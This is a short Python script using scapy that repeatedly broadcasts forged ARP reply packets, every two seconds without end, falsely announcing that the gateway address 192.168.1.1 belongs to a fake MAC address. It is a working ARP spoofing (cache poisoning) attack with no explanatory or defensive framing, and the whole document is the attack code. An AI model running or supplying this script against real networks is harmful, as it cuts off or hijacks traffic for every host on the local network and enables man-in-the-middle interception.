from scapy.all import ARP, Ether, sendp
import time

gateway_ip = "192.168.1.1"
target_ip = "192.168.1.255"   # broadcast target

fake_mac = "AA:AA:AA:AA:AA:AA"

packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,
    psrc=gateway_ip,
    pdst=target_ip,
    hwsrc=fake_mac
)

while True:
    sendp(packet, verbose=False)
    print("Broadcasting fake ARP packet...")
    time.sleep(2)